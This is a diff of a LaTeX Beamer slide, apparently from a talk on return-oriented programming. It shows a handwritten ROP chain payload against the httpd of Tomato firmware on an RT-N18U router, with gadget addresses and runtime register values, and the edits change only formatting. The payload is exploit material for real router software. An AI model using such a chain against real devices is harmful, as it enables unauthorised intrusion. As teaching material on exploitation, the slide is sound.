@@ -610,10 +610,11 @@ BoldItalicFont=Ubuntu-BoldItalic.ttf
 
 \begin{frame}{\theframenumber. Example of a Handwritten ROP-Chain on tomato-RT-N18U-httpd}
       \textbf{Payload}: \\
-
+      \vspace{4pt}
+      
       00013200~0002bc3e~0002bc3e~00000000~deba5e12~d000dl3d \\
       00015330~deba5e12~feedc0de~badb17e5~0000000b \\
-      0001c64c \\
+      0001c64c 
       \Gap
       
 \textbf{Runtime}: \\ 
@@ -628,7 +629,7 @@ R0: 0002bc3e \\
 R1: 0002bc3e \\
 R2: 00000000 \\
 R7: 0000000b \\
-0001c64c svcpl 0x00707070 \\ % CHECK!
+0001c64c svcpl 0x00707070  % CHECK!
 
 \end{frame}
 
